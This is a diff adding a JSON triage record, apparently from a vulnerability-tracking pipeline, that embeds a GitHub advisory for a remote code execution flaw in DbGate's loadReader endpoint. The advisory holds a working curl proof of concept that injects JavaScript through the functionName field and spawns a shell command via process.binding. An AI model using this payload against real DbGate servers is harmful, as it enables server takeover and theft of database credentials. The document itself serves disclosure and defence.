@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/61591917?v=4\", \"events_url\": \"https://api.github.com/users/romain-deperne/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/romain-deperne/followers\", \"following_url\": \"https://api.github.com/users/romain-deperne/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/romain-deperne/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/romain-deperne\", \"id\": 61591917, \"login\": \"romain-deperne\", \"node_id\": \"MDQ6VXNlcjYxNTkxOTE3\", \"organizations_url\": \"https://api.github.com/users/romain-deperne/orgs\", \"received_events_url\": \"https://api.github.com/users/romain-deperne/received_events\", \"repos_url\": \"https://api.github.com/users/romain-deperne/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/romain-deperne/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/romain-deperne/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/romain-deperne\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-48017\", \"cvss\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-94\", \"name\": \"Improper Control of Generation of Code ('Code Injection')\"}], \"description\": \"### Summary\\n\\nThe `POST /runners/load-reader` endpoint in DbGate accepts a `functionName` parameter that is directly interpolated into a JavaScript code template without any sanitization or validation. An authenticated user (with basic access, no special permissions required) can inject arbitrary JavaScript code that executes on the server with full process privileges, bypassing the `require=null` sandbox restriction.\\n\\n### Details\\n\\nThe `loadReader` endpoint in `packages/api/src/controllers/runners.js` (line 353) takes a `functionName` parameter from the request body and passes it to `compileShellApiFunctionName()` which performs no sanitization:\\n\\n**Vulnerable code** ([permalink](https://github.com/dbgate/dbgate/blob/ea3a61077ab09775c39890c465f0b3e97f6c812e/packages/api/src/controllers/runners.js#L352-L368)):\\n\\n```javascript\\n  loadReader_meta: true,\\n  async loadReader({ functionName, props }) {\\n    if (!platformInfo.isElectron) {\\n      if (props?.fileName && !checkSecureDirectories(props.fileName)) {\\n        return { errorMessage: 'DBGM-00289 Unallowed file' };\\n      }\\n    }\\n    const prefix = extractShellApiPlugins(functionName)\\n      .map(packageName => `// @require ${packageName}\\\\n`)\\n      .join('');\\n\\n    const promise = new Promise((resolve, reject) => {\\n      const runid = crypto.randomUUID();\\n      this.requests[runid] = { resolve, reject, exitOnStreamError: true };\\n      this.startCore(runid, loaderScriptTemplate(prefix, functionName, props, runid));\\n    });\\n    return promise;\\n  },\\n```\\n\\nThe `loaderScriptTemplate` at line 57-68 directly interpolates the compiled function name:\\n\\n```javascript\\nconst loaderScriptTemplate = (prefix, functionName, props, runid) => `\\n${prefix}\\nconst dbgateApi = require(process.env.DBGATE_API);\\ndbgateApi.initializeApiEnvironment();\\n${requirePluginsTemplate(extractShellApiPlugins(functionName, props))}\\nrequire=null;\\nasync function run() {\\nconst reader=await ${compileShellApiFunctionName(functionName)}(${JSON.stringify(props)});\\nconst writer=await dbgateApi.collectorWriter({runid: '${runid}'});\\nawait dbgateApi.copyStream(reader, writer);\\n}\\ndbgateApi.runScript(run);\\n`;\\n```\\n\\nThe `compileShellApiFunctionName` in `packages/tools/src/packageTools.ts` (line 30-35) performs no validation:\\n\\n```typescript\\nexport function compileShellApiFunctionName(functionName) {\\n  const nsMatch = functionName.match(/^([^@]+)@([^@]+)/);\\n  if (nsMatch) {\\n    return `${_camelCase(nsMatch[2])}.shellApi.${nsMatch[1]}`;\\n  }\\n  return `dbgateApi.${functionName}`;\\n}\\n```\\n\\n**Two injection vectors:**\\n1. Without `@`: The entire `functionName` is appended after `dbgateApi.` without sanitization\\n2. With `@`: The part before `@` (`nsMatch[1]`) is appended after `.shellApi.` without sanitization (only the part after `@` goes through `_camelCase`)\\n\\nAlthough the script template sets `require=null`, the `process` global is still available. `process.binding(\\\"spawn_sync\\\")` provides direct access to spawn child processes, completely bypassing the sandbox.\\n\\n**Compare with safe code in the same file** (line 292):\\n\\n```javascript\\n  start_meta: true,\\n  async start({ script }, req) {\\n    // ...\\n    await testStandardPermission('run-shell-script', req);  // <-- Permission check!\\n    if (!platformInfo.allowShellScripting) {                 // <-- Platform check!\\n      return { errorMessage: 'DBGM-00286 Shell scripting is not allowed' };\\n    }\\n    // ...\\n  },\\n```\\n\\nThe `start` endpoint requires the `run-shell-script` permission and checks `allowShellScripting`. The `loadReader` endpoint has **neither** of these checks, making it a privilege escalation from any authenticated user to full RCE.\\n\\n### PoC\\n\\nAn authenticated user sends a POST request to `/runners/load-reader` with a crafted `functionName`:\\n\\n```bash\\n# The malicious functionName breaks out of the expression and injects\\n# process.binding(\\\"spawn_sync\\\") to execute arbitrary commands.\\n# The // at the end comments out the remaining template code.\\n\\ncurl -X POST http://TARGET:3000/runners/load-reader \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -H \\\"Authorization: Bearer <JWT_TOKEN>\\\" \\\\\\n  -d '{\\n    \\\"functionName\\\": \\\"toString();var __r=process.binding(\\\\\\\"spawn_sync\\\\\\\").spawn({file:\\\\\\\"/bin/sh\\\\\\\",args:[\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-c\\\\\\\",\\\\\\\"id > /tmp/dbgate-rce-proof\\\\\\\"],envPairs:[],stdio:[{type:\\\\\\\"pipe\\\\\\\",readable:true,writable:false},{type:\\\\\\\"pipe\\\\\\\",readable:false,writable:true},{type:\\\\\\\"pipe\\\\\\\",readable:false,writable:true}]});dbgateApi.toString//\\\",\\n    \\\"props\\\": {}\\n  }'\\n```\\n\\nThis generates the following JavaScript that is forked as a child process:\\n\\n```javascript\\nconst dbgateApi = require(process.env.DBGATE_API);\\ndbgateApi.initializeApiEnvironment();\\nrequire=null;\\nasync function run() {\\nconst reader=await dbgateApi.toString();var __r=process.binding(\\\"spawn_sync\\\").spawn({file:\\\"/bin/sh\\\",args:[\\\"/bin/sh\\\",\\\"-c\\\",\\\"id > /tmp/dbgate-rce-proof\\\"],envPairs:[],stdio:[{type:\\\"pipe\\\",readable:true,writable:false},{type:\\\"pipe\\\",readable:false,writable:true},{type:\\\"pipe\\\",readable:false,writable:true}]});dbgateApi.toString//({})\\n// ... rest of template\\n}\\ndbgateApi.runScript(run);\\n```\\n\\nAfter the request, `/tmp/dbgate-rce-proof` contains the output of `id`, confirming arbitrary command execution.\\n\\nA standalone PoC script is available at: `reports/cve-hunting/pocs/dbgate/rce_loadreader_functionname_injection.py`\\n\\n### Impact\\n\\nAn authenticated user with **basic access** (no admin role, no `run-shell-script` permission required) can:\\n\\n1. **Execute arbitrary OS commands** on the DbGate server with the privileges of the Node.js process\\n2. **Read/write any file** accessible to the process\\n3. **Pivot to connected databases** by reading connection credentials from DbGate's storage\\n4. **Compromise the host system** - in Docker deployments, this typically means root access within the container\\n\\nThis is particularly severe because:\\n- No special permissions are required beyond basic authentication\\n- The `require=null` sandbox is completely bypassed via `process.binding(\\\"spawn_sync\\\")`\\n- The `loadReader` endpoint lacks the permission checks present on the `start` endpoint\\n- DbGate is commonly deployed as a web-accessible database management tool\", \"epss\": {\"percentage\": 0.0051, \"percentile\": 0.39554}, \"ghsa_id\": \"GHSA-hv83-ggc4-v385\", \"github_reviewed_at\": \"2026-06-05T16:39:38Z\", \"html_url\": \"https://github.com/advisories/GHSA-hv83-ggc4-v385\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hv83-ggc4-v385\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-48017\"}], \"nvd_published_at\": \"2026-06-15T22:16:16Z\", \"published_at\": \"2026-06-05T16:39:38Z\", \"references\": [\"https://github.com/dbgate/dbgate/security/advisories/GHSA-hv83-ggc4-v385\", \"https://github.com/dbgate/dbgate/releases/tag/v7.1.9\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-48017\", \"https://github.com/advisories/GHSA-hv83-ggc4-v385\"], \"repository_advisory_url\": \"https://api.github.com/repos/dbgate/dbgate/security-advisories/GHSA-hv83-ggc4-v385\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/dbgate/dbgate\", \"summary\": \"DbGate: Remote Code Execution via functionName injection in loadReader endpoint\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-08T17:36:01Z\", \"url\": \"https://api.github.com/advisories/GHSA-hv83-ggc4-v385\", \"vulnerabilities\": [{\"first_patched_version\": \"7.1.9\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"dbgate-api\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 7.1.8\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hv83-ggc4-v385",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "dbgate-api: <= 7.1.8"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-48017"
+    ],
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "dbgate-api"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.631389Z",
+  "provenance": {
+    "content_sha256": "fa649906be4627b5cfc6f22e2e0f2656f6db6c7d7f4f3c2d1198f042713cdf3b",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-05T16:39:38Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hv83-ggc4-v385",
+  "status": "active",
+  "title": "DbGate: Remote Code Execution via functionName injection in loadReader endpoint",
+  "updated_at": "2026-07-08T17:36:01Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hv83-ggc4-v385"
+}
